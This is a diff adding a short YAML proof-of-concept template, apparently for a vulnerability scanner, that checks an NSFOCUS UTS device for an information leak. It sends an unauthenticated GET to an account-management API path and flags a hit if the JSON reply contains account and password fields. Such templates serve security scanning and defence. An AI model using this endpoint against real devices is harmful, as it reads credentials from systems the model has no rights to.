@@ -1,0 +1,17 @@
+name: yaml-poc-nsfocus-uts-leak-CT-158435
+binding: 50984c42-ad43-40fd-9fb0-e95b5246610f
+detail:
+    author: system_user
+    vulnerability:
+        id: a3edab03-c1ad-4834-8458-36ae0a212e13
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /webapi/v1/system/accountmanage/account
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"account") && response.body.bcontains(b"password")
+expression: r0()
